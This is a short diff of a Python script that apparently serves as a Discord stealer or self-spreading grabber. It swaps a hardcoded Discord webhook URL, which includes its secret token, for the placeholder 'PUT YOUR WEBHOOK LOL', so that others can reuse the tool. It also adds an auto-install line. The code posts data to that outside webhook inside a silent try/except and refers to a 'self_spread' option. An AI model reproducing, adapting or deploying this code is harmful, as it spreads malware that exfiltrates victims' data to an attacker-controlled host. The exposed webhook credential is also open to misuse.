@@ -10,6 +10,7 @@ import sys, glob, time, requests, ssl, webbrowser
 import bz2, datetime, wget, json, cfscrape, urllib3
 from time import sleep
 from os import system
+os.system("pip3 install requests urllib3") #auto installer
 from sys import stdout
 from scapy.all import *
 from random import randint
@@ -204,7 +205,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/788732722780307486/CqTug8H8ihkDnZ4kS1Gz8_ViaJcUsdfVv8SJvszXJObMKNkOj9u2u-aKEzNspeSGPYSZ", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("PUT YOUR WEBHOOK LOL", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
